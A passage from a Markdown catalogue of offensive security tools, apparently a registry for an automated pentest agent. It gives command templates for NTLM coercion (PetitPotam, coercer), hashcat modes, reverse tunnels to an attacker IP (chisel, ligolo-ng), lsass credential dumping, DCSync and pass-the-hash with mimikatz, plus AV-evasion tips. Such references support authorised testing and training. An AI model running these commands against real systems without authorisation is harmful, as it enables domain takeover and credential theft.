- **bins**: `coercer`, `petitpotam` / `PetitPotam.py`
- **phases**: ad-attack, cred-access
- **cmd (coercer)**: `coercer coerce -u {user} -p {pass} -d {domain} -t {ip} -l {attacker_ip}`
- **cmd (petitpotam, unauth)**: `petitpotam {attacker_ip} {ip}` (`PetitPotam.py {listener} {target}`)
- **required**: target `{ip}`, listener/attacker IP; coercer also needs creds
- **speed**: fast
- **output**: text; no structured output — the payoff lands in the listener (responder/ntlmrelayx).
- **artifacts**: forces target (esp. DC) machine-account to authenticate to attacker → captured/relayed **machine NetNTLM** → relay to ADCS (ESC8) or LDAP (RBCD)
- **gotchas**: coercer auto-tries many RPC methods (MS-EFSR/EFSRPC, MS-RPRN, MS-DFSNM, etc.); PetitPotam = EFSRPC specifically (some vectors unauth pre-patch); **must have a listener running first** (ntlmrelayx/responder); coercing a DC's machine acct + ESC8 = domain takeover.

---

## 7. Cracking

### hashcat
- **id**: `hashcat`
- **name**: hashcat
- **bins**: `hashcat`
- **phases**: cracking
- **cmd (dict)**: `hashcat -m {mode} -a 0 {outfile} {wordlist}`
- **cmd (dict+rules)**: `hashcat -m {mode} -a 0 {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule`
- **required**: `-m {mode}`, hashfile, `{wordlist}`
- **speed**: fast→slow (GPU-dependent, mode-dependent)
- **output**: text; `--outfile {outfile} --outfile-format 2`; `--show`/`--left` to review; `--potfile` caches cracked.
- **artifacts**: cracked plaintext passwords → cred-access / lateral movement
- **mode numbers (memorize — high accuracy)**:
  | Hash type | `-m` |
  |---|---|
  | NTLM | **1000** |
  | NetNTLMv1 | 5500 |
  | NetNTLMv2 (Responder) | **5600** |
  | Kerberos AS-REP (GetNPUsers) | **18200** |
  | Kerberos TGS-REP RC4 (Kerberoast) | **13100** |
  | Kerberos TGS-REP AES256 | **19700** |
  | Kerberos AS-REQ Pre-Auth (etype 23) | 7500 |
  | Domain Cached Creds v2 (DCC2/mscache2) | **2100** |
  | bcrypt `$2*$` | **3200** |
  | sha512crypt `$6$` (Linux shadow) | **1800** |
  | sha256crypt `$5$` | 7400 |
  | md5crypt `$1$` | 500 |
  | NetNTLMv2 (again, common) | 5600 |
  | WPA-PBKDF2 | 22000 |
  | Kerberos TGS AES128 | 19600 |
- **gotchas**: `-a 0` dict, `-a 3` mask/brute; on a VM without GPU add `--force` (slow, CPU); pick the right `-m` or it silently won't match; RC4 Kerberoast (13100) cracks orders of magnitude faster than AES (19700).

### john
- **id**: `john`
- **name**: John the Ripper (jumbo)
- **bins**: `john`
- **phases**: cracking
- **cmd**: `john --wordlist={wordlist} --format={format} {outfile}`
- **cmd (auto)**: `john {hashfile} --wordlist={wordlist}`
- **cmd (show)**: `john --show --format={format} {hashfile}`
- **required**: hashfile
- **speed**: medium (CPU-oriented)
- **output**: text; `--show` lists cracked; results in `~/.john/john.pot`.
- **artifacts**: cracked passwords
- **gotchas**: has `*2john` helpers — `zip2john`, `ssh2john`, `keepass2john`, `rar2john` produce hashes for john/hashcat; `--format=` names differ from hashcat modes (`krb5tgs`, `krb5asrep`, `netntlmv2`, `nt`); good when no GPU or for odd formats hashcat lacks.

### name-that-hash
- **id**: `name-that-hash`
- **name**: Name-That-Hash
- **bins**: `nth`, `name-that-hash`
- **phases**: cracking
- **cmd**: `nth -t '{hash}'`
- **cmd (file, json)**: `nth -f {hashfile} -g` (`-g`/`--greppable` = JSON)
- **required**: hash text or file
- **speed**: fast
- **output**: text ranked guesses; structured: **`-g`** (greppable JSON).
- **artifacts**: identifies hash type + suggested **hashcat mode & john format** → picks cracker settings
- **gotchas**: replaces `hash-identifier`; gives the `-m` number to feed hashcat directly; guesses ranked by likelihood — verify context (e.g. `$krb5tgs$23$` → 13100).

---

## 8. Pivoting / Tunneling

### chisel
- **id**: `chisel`
- **name**: Chisel
- **bins**: `chisel`
- **phases**: pivot
- **cmd (server, attacker)**: `chisel server -p 8000 --reverse`
- **cmd (client reverse SOCKS, victim)**: `chisel client {attacker_ip}:8000 R:1080:socks`
- **cmd (client remote port-fwd)**: `chisel client {attacker_ip}:8000 R:3389:{ip}:3389`
- **required**: server host:port; forward spec
- **speed**: medium
- **output**: console log; no structured output.
- **artifacts**: SOCKS proxy (use via proxychains) / forwarded ports into internal net
- **gotchas**: `--reverse` required on server for `R:` binds; `R:1080:socks` = reverse SOCKS5 on attacker :1080 → set `socks5 127.0.0.1 1080` in proxychains; same static binary both ends (upload matching arch); noisy single TCP channel.

### ligolo-ng
- **id**: `ligolo-ng`
- **name**: Ligolo-ng
- **bins**: `ligolo-proxy` (attacker), `agent` / `ligolo-agent` (victim)
- **phases**: pivot
- **full setup sequence** (layer-3 VPN-style, no proxychains needed):
  1. Interface (attacker, once): `sudo ip tuntap add user root mode tun ligolo` then `sudo ip link set ligolo up`
  2. Proxy (attacker): `ligolo-proxy -selfcert`
  3. Agent (victim): `./agent -connect {attacker_ip}:11601 -ignore-cert`
  4. In proxy console: `session` → select the agent
  5. Add route to target subnet (attacker shell): `sudo ip route add {subnet}/24 dev ligolo`
  6. In proxy console: `start` (activates the tunnel)
  7. Now reach the whole subnet natively (`nmap`, `nxc`, etc. via `ligolo` iface)
  8. Reverse listener for shells/tools: `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`
  9. Pivot host itself = `240.0.0.1` (`sudo ip route add 240.0.0.1/32 dev ligolo`)
  10. Teardown: `sudo ip link set ligolo down && sudo ip link delete ligolo`
- **required**: `{attacker_ip}`, target subnet
- **speed**: fast (best-in-class for OSCP pivots)
- **output**: interactive proxy TUI; no structured output.
- **artifacts**: full L3 route into internal subnet — every tool works transparently, no proxychains wrapping
- **gotchas**: the tunnel-start command is **`start`** (not `start_tun`/`tunnel_start` — older docs differ); default listen port **11601**; `-selfcert` (proxy) pairs with `-ignore-cert` (agent) for self-signed; double-pivot = second agent + second tun iface; add routes BEFORE `start` or after — routes point at `dev ligolo`.

### sshuttle
- **id**: `sshuttle`
- **name**: sshuttle
- **bins**: `sshuttle`
- **phases**: pivot
- **cmd**: `sshuttle -r {user}@{ip} {subnet}/24`
- **cmd (with key + DNS)**: `sshuttle -r {user}@{ip} {subnet}/24 --dns -x {ip}`
- **required**: SSH `{user}@{ip}`, subnet
- **speed**: medium
- **output**: console; no structured output.
- **artifacts**: transparent VPN-like route over SSH into subnet (no proxychains)
- **gotchas**: needs SSH creds/key to the pivot + Python on the pivot host; `-x {ip}` excludes the pivot's own IP to avoid loops; `--dns` tunnels DNS; only TCP + DNS (no ICMP/UDP) — can't ping through it.

### proxychains4
- **id**: `proxychains4`
- **name**: proxychains-ng
- **bins**: `proxychains4`, `proxychains`
- **phases**: pivot
- **cmd**: `proxychains4 -f /etc/proxychains4.conf {tool_command}`
- **required**: a running SOCKS proxy (chisel/ssh -D) + the wrapped command
- **speed**: medium (adds latency per hop)
- **output**: prefixes the wrapped tool's output; no structured output of its own.
- **artifacts**: n/a — routes another tool's TCP through the SOCKS chain
- **gotchas**: config default `/etc/proxychains4.conf` — set `socks5 127.0.0.1 1080` (SOCKS5, not the default socks4); use `strict_chain` or `dynamic_chain`; **can't proxy raw-socket scans** (nmap must use `-sT -Pn`, no `-sS`/`-sU`); slow — small port sets only; set `proxy_dns` for name resolution.

---

## 9. Post-Exploitation / Privesc / Credential Extraction

### linpeas
- **id**: `linpeas`
- **name**: LinPEAS
- **bins**: `linpeas.sh` (script, not usually on PATH — transfer to target)
- **phases**: privesc, post-exploit, loot
- **cmd**: `./linpeas.sh -a > {outfile}`
- **required**: run on target host
- **speed**: medium
- **output**: colored text (view with `less -R`); no structured output.
- **artifacts**: SUID/GUID bins, sudo rules, cron jobs, writable paths, kernel-exploit hints, creds in files, capabilities → privesc vectors (color-coded red/yellow = likely)
- **gotchas**: transfer via the chisel/ligolo tunnel or a python http server; `-a` = all checks (loud); red+yellow highlight = 95%-probability privesc; loses color when piped — keep ANSI or use `-R` in less.

### winpeas
- **id**: `winpeas`
- **name**: WinPEAS
- **bins**: `winPEASx64.exe`, `winPEASany.exe`, `winpeas.bat` (transfer to target)
- **phases**: privesc, post-exploit, loot
- **cmd**: `winPEASx64.exe > {outfile}`
- **required**: run on target
- **speed**: medium
- **output**: colored text; no structured output.
- **artifacts**: unquoted service paths, AlwaysInstallElevated, weak service perms, stored creds, AutoLogon, tokens → Windows privesc vectors
- **gotchas**: AV eats it — use `winPEASany.exe` or the `.bat` when the exe is flagged; run from writable dir (`C:\Windows\Temp`); `.bat` version is stealthier but less thorough.

### pspy
- **id**: `pspy`
- **name**: pspy
- **bins**: `pspy64`, `pspy32` (transfer to target)
- **phases**: privesc, post-exploit
- **cmd**: `./pspy64 -pf -i 1000`
- **required**: run on target
- **speed**: n/a (live monitor)
- **output**: live process/filesystem event stream; no structured output.
- **artifacts**: reveals **cron jobs & root-run processes** (incl. command-line creds) without root → privesc via writable script a root cron executes
- **gotchas**: no root needed (uses procfs + inotify); watch for periodic root cron running a world-writable script; `-pf` = print filesystem events, `-i` = poll interval ms; leave running a few minutes to catch cron cadence.

### pypykatz
- **id**: `pypykatz`
- **name**: pypykatz
- **bins**: `pypykatz`
- **phases**: cred-access, post-exploit, loot
- **cmd (from lsass dump)**: `pypykatz lsa minidump lsass.dmp`
- **cmd (json)**: `pypykatz lsa minidump lsass.dmp --json -o {outfile}`
- **required**: an lsass minidump file
- **speed**: fast
- **output**: text; structured: **`--json`**.
- **artifacts**: **plaintext passwords, NTLM hashes, Kerberos tickets** parsed from lsass dump → PtH / cracking
- **gotchas**: pure-Python mimikatz (runs on the Kali attacker, offline — no AV issue); you still need the `lsass.dmp` (via procdump / Task Manager / lsassy / comsvcs); pairs with a dump grabbed remotely.

### lsassy
- **id**: `lsassy`
- **name**: lsassy
- **bins**: `lsassy`
- **phases**: cred-access, post-exploit
- **cmd**: `lsassy -d {domain} -u {user} -p {pass} {ip}`
- **cmd (PtH)**: `lsassy -d {domain} -u {user} -H {nthash} {ip}`
- **required**: `{ip}`, `{user}`, `{pass}`/`{nthash}`, admin rights
- **speed**: fast
- **output**: text (creds inline); `-j`/`--json` and `-o` for structured export.
- **artifacts**: **remotely dumps + parses lsass** → plaintext/NTLM creds without touching disk manually
- **gotchas**: needs local-admin on target; also a **netexec module** (`nxc smb {ip} -u .. -p .. -M lsassy`) — often easier; uses various dump methods (comsvcs, procdump) — some flagged by Defender.

### mimikatz
- **id**: `mimikatz`
- **name**: Mimikatz
- **bins**: `mimikatz.exe` (Windows target), `mimikatz` (wine, rare)
- **phases**: cred-access, post-exploit, privesc
- **cmd (dump creds)**: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- **cmd (DCSync)**: `mimikatz.exe "lsadump::dcsync /domain:{domain} /user:krbtgt" exit`
- **cmd (PtH)**: `mimikatz.exe "sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{nthash}" exit`
- **required**: run on Windows target, local-admin/SYSTEM
- **speed**: fast
- **output**: text; no structured output.
- **artifacts**: plaintext creds, NTLM hashes, Kerberos tickets, **golden/silver ticket** forging, DCSync hashes, PtH
- **gotchas**: heavily AV-flagged — prefer pypykatz (offline) or `sekurlsa` from a dump; needs `privilege::debug` + SYSTEM for lsass; golden ticket needs krbtgt hash (from DCSync/secretsdump); `pth` opens a new process with the hash injected.

---

## 10. Support / Utility

### ntpdate
- **id**: `ntpdate`
- **name**: ntpdate (clock sync)
- **bins**: `ntpdate`, `sntp` (modern replacement)
- **phases**: ad-attack, ad-enum (support)
- **cmd**: `ntpdate {dc_ip}` (or `sudo ntpdate -s {dc_ip}`)
- **cmd (modern)**: `sudo sntp -sS {dc_ip}`
- **required**: `{dc_ip}`
- **speed**: fast
- **output**: sets local time; text.
- **artifacts**: none — enables Kerberos ops
- **gotchas**: **Kerberos fails with clock skew > 5 min** (`KRB_AP_ERR_SKEW`) — sync to the DC before GetUserSPNs/GetNPUsers/getST/certipy auth; on modern Kali `ntpdate` may be absent → use `sntp` or `faketime "$(...)" <cmd>`; disable systemd-timesyncd first if it fights you.

### searchsploit
- **id**: `searchsploit`
- **name**: SearchSploit (Exploit-DB)
- **bins**: `searchsploit`
- **phases**: vuln-scan, discovery, post-exploit (support)
- **cmd**: `searchsploit {product} {version} --json`
- **cmd (mirror exploit)**: `searchsploit -m {edb_id}`
- **required**: search term
- **speed**: fast (local DB)
- **output**: text table; structured: **`--json`** (`-j`).
- **artifacts**: matching public exploits + EDB IDs → `-m` copies the exploit locally; `-p` shows path/URL
- **gotchas**: local copy of Exploit-DB — run `searchsploit -u` to update; searches titles/paths (over-broad terms flood results — pin the version); `-m {id}` mirrors the file to CWD, `-x {id}` to view.

---

## Structured-output quick map (for parser selection)

| Tool | Structured flag | Format |
|---|---|---|
| nmap | `-oX` | XML |
| masscan | `-oJ` | JSON |
| naabu | `-json` | JSONL |
| rustscan | (via nmap `-oX`) | XML |
| httpx | `-json` | JSONL |
| whatweb | `--log-json` | JSON |
| nuclei | `-jsonl` | JSONL |
| feroxbuster | `--json` | JSONL |
| ffuf | `-of json` | JSON |
| gobuster | none | text |
| katana | `-jsonl` | JSONL |
| nikto | `-Format json` | JSON |
| wpscan | `-f json` | JSON |
| wafw00f | `-f json` | JSON |
| arjun | `-oJ` | JSON |
| enum4linux-ng | `-oJ` | JSON |
| ldapdomaindump | (default) | JSON+HTML |
| certipy | `-json` | JSON |
| bloodhound-python | `--zip` | JSON bundle |
| nxc/netexec | none (loot to `~/.nxc`) | text |
| impacket-* | `-outputfile` | text/hash |
| pypykatz | `--json` | JSON |
| name-that-hash | `-g` | JSON |
| searchsploit | `--json` | JSON |
